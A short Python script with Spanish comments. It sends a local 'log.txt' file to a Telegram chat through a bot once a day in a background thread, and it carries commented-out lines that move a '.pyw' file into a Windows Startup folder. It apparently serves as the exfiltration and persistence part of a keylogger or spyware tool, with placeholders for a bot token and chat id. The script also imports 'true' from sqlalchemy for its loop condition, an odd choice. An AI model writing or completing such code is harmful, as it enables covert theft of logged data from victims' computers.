from sqlalchemy import true
import telebot
from datetime import datetime
import time
import threading
#enviar archivo
from telebot import types
import shutil


bot=telebot.TeleBot('TOKEN')#colocar el token del bot de telegram aqui
def enviar_archivo():
    while true:
        bot.send_document('-', open('log.txt', 'rb'))#en el primer parametro colocar el id del chat sin borrar el -
        time.sleep(86400)#colocar el tiempo en segundos que se quiere enviar el archivo

f=threading.Thread(target=enviar_archivo)
f.start()
#mover a la carpeta inicio
#destination=r'C:\Users\santi\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
#shutil.move('prueba.pyw',destination)





   
